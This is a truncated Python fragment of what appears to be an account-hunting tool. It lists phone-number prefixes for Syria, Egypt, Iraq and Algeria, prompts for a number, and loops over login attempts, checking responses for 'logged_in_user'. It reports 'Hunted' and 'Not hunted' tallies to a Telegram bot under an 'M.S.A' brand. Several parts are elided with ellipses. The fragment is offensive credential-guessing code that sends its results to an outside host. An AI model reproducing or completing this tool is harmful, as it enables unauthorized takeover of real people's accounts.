...
try:
    ...
    a(B + '  Syria : 09                                               ')
    a(Y + '  Egypt : 010 or 011 or 012 or 015                                                                                      ')
    a(F + '  iraq : 077 or 078 or 075                                                      ')
    a(C + '  Algeria : 05 or 06 or 07                                 ')
    phonenumber = input(X +
    ...
    while True:
        ...
        if 'logged_in_user' in req.json():
            ...
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= M.S.A IS HERE \n\nTh THIS TOOL BY M.S.A ⭐\n->•My Channel 👇✔️\n√| @SQ21C |√\n->• My Id 👇✔️\n√|M.S.A|√\n\n->• Hunted✔️ [{zz}]\n->•🇳\u200aNot hunted❌ [{aa}]")
